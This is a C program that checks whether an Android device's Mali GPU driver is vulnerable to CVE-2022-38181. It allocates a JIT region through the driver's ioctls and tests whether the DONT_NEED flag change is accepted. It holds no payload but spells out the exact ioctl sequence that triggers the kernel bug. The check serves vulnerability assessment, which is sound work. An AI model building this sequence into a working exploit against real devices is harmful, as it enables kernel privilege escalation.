/*
 * CVE-2022-38181 Vulnerability Check (JIT DONT_NEED Test)
 *
 * Allocates a JIT region via JOB_SUBMIT, then attempts
 * MEM_FLAGS_CHANGE(DONT_NEED). If the driver accepts
 * DONT_NEED on a JIT region, CVE-2022-38181 is exploitable.
 * If EINVAL, the no_user_free_count guard blocks it.
 *
 * Build: make -f ../../common/Makefile.ndk
 * Run:   ./vuln_check_jit
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#include "mali.h"

static int mali_fd;

static int mali_setup(int fd) {
    struct kbase_ioctl_version_check ver = {0, 0};
    if (ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &ver))
        { perror("VERSION_CHECK"); return -1; }
    printf("[*] Mali version: %u.%u\n", ver.major, ver.minor);
    struct kbase_ioctl_set_flags flags = {0};
    if (ioctl(fd, KBASE_IOCTL_SET_FLAGS, &flags))
        { perror("SET_FLAGS"); return -1; }
    return 0;
}

static uint64_t jit_allocate(int fd, void *cpu_alloc) {
    struct base_jit_alloc_info info = {};
    info.id = 1;
    info.gpu_alloc_addr = (uint64_t)cpu_alloc;
    info.va_pages = 25;
    info.commit_pages = 25;
    info.extension = 0x1000;

    struct {
        uint64_t jc;
        uint64_t udata[2];
        uint64_t extres_list;
        uint16_t nr_extres;
        uint8_t  jit_id[2];
        uint8_t  pre_dep[4];
        uint8_t  atom_number;
        uint8_t  prio;
        uint8_t  device_nr;
        uint8_t  jobslot;
        uint32_t core_req;
    } __attribute__((packed)) atom;
    memset(&atom, 0, sizeof(atom));
    atom.jc = (uint64_t)&info;
    atom.atom_number = 1;
    atom.core_req = BASE_JD_REQ_SOFT_JIT_ALLOC;
    atom.nr_extres = 1;

    struct kbase_ioctl_job_submit submit = {
        .addr = (uint64_t)&atom, .nr_atoms = 1, .stride = 48
    };
    if (ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &submit) < 0)
        { perror("JOB_SUBMIT(JIT_ALLOC)"); return 0; }

    usleep(100000);
    return *(uint64_t *)cpu_alloc;
}

int main(void) {
    printf("[*] CVE-2022-38181 vulnerability check (JIT DONT_NEED)\n");
    printf("[*] uid=%d\n\n", getuid());

    mali_fd = open("/dev/mali0", O_RDWR);
    if (mali_fd < 0) { perror("open /dev/mali0"); return 1; }

    if (mali_setup(mali_fd)) return 1;

    mmap(NULL, 0x1000, PROT_NONE, MAP_SHARED, mali_fd,
         BASE_MEM_MAP_TRACKING_HANDLE);

    struct kbase_ioctl_mem_jit_init jit = {
        .va_pages = 0x1000, .max_allocations = 100,
        .trim_level = 100, .phys_pages = 0x1000,
    };
    if (ioctl(mali_fd, KBASE_IOCTL_MEM_JIT_INIT, &jit))
        { perror("JIT_INIT"); return 1; }

    union kbase_ioctl_mem_alloc alloc = {};
    alloc.in.va_pages = 1;
    alloc.in.commit_pages = 1;
    alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                     BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
    if (ioctl(mali_fd, KBASE_IOCTL_MEM_ALLOC, &alloc))
        { perror("MEM_ALLOC"); return 1; }
    void *cpu = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                     MAP_SHARED, mali_fd, alloc.out.gpu_va);
    if (cpu == MAP_FAILED) { perror("mmap"); return 1; }
    memset(cpu, 0, 0x1000);

    uint64_t jit_addr = jit_allocate(mali_fd, cpu);
    printf("[*] JIT alloc result: 0x%llx\n", (unsigned long long)jit_addr);
    if (!jit_addr) { printf("[-] JIT alloc failed\n"); return 1; }

    printf("\n[*] KEY TEST: MEM_FLAGS_CHANGE(DONT_NEED) on JIT region\n");
    struct kbase_ioctl_mem_flags_change chg = {
        .gpu_va = jit_addr, .flags = BASE_MEM_DONT_NEED,
        .mask = BASE_MEM_DONT_NEED
    };
    int ret = ioctl(mali_fd, KBASE_IOCTL_MEM_FLAGS_CHANGE, &chg);

    if (ret == 0) {
        printf("[+] DONT_NEED on JIT SUCCEEDED — CVE-2022-38181 EXPLOITABLE\n");
    } else {
        printf("[-] DONT_NEED on JIT: %s (errno=%d)\n", strerror(errno), errno);
        if (errno == EINVAL)
            printf("[-] PATCHED — no_user_free_count blocks DONT_NEED on JIT\n");
    }

    close(mali_fd);
    return ret == 0 ? 0 : 1;
}
